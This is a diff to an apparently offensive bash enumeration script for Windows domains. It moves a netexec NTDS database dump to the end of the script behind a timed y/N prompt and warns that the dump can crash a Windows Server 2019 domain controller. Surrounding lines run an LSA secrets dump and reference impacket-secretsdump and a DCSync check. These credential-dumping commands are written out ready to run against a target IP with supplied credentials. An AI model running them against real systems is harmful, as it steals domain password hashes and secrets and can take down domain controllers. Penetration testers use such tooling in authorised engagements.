@@ -1104,13 +1104,6 @@ if [ "$os_type" = "windows" ]; then
     
         echo -e "\n\033[91m[+] LSA Secrets Dump\033[0m\n"
         unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt
-    
-        echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
-        echo -e "\033[93m[!] Note: NTDS dump can crash DC on Windows Server 2019. Skipping by default.\033[0m"
-        echo -e "\033[96m[+] Alternative: Use impacket-secretsdump (already run in RPC section above)\033[0m"
-        echo -e "\033[96m[+] Or manually run: nxc smb $IP $USER_FLAG --ntds\033[0m"
-        # Auto-answer 'n' to skip the interactive prompt
-        # echo 'n' | unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
     else
         echo -e "\n\033[93m[!] Skipping Additional Windows Enumeration (no username supplied)\033[0m"
     fi
@@ -1198,3 +1191,31 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
         echo -e "\n\033[93m[!] Skipping DCSync rights check (no domain name provided)\033[0m"
     fi
 fi
+
+# NTDS Dump - Run at the very end since it can crash the DC
+if [ "$os_type" = "windows" ] && [ -n "$user" ]; then
+    echo -e "\n\033[96m[+] ========================================\033[0m"
+    echo -e "\033[96m[+] FINAL CHECK: NTDS Database Dump\033[0m"
+    echo -e "\033[96m[+] ========================================\033[0m\n"
+    
+    echo -e "\033[93m[!] WARNING: NTDS dump can crash DC on Windows Server 2019!\033[0m"
+    echo -e "\033[93m[!] This is run LAST to avoid interrupting other enumeration.\033[0m"
+    echo -e "\033[96m[+] Alternative: impacket-secretsdump was already run above (safer)\033[0m\n"
+    
+    echo -e "\033[96m[?] Proceed with NTDS dump? [y/N]\033[0m"
+    read -t 10 -n 1 response
+    echo ""
+    
+    if [[ "$response" =~ ^[Yy]$ ]]; then
+        echo -e "\n\033[91m[+] Running NTDS Dump...\033[0m\n"
+        unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
+    else
+        echo -e "\033[93m[!] NTDS dump skipped (timed out or declined)\033[0m"
+        echo -e "\033[96m[+] To run manually: nxc smb $IP $USER_FLAG --ntds\033[0m"
+    fi
+fi
+
+echo -e "\n\033[92m[+] ========================================\033[0m"
+echo -e "\033[92m[+] Enumeration Complete!\033[0m"
+echo -e "\033[92m[+] ========================================\033[0m\n"
+echo -e "\033[96m[+] Results saved to: $(pwd)/nxc-enum/\033[0m\n"
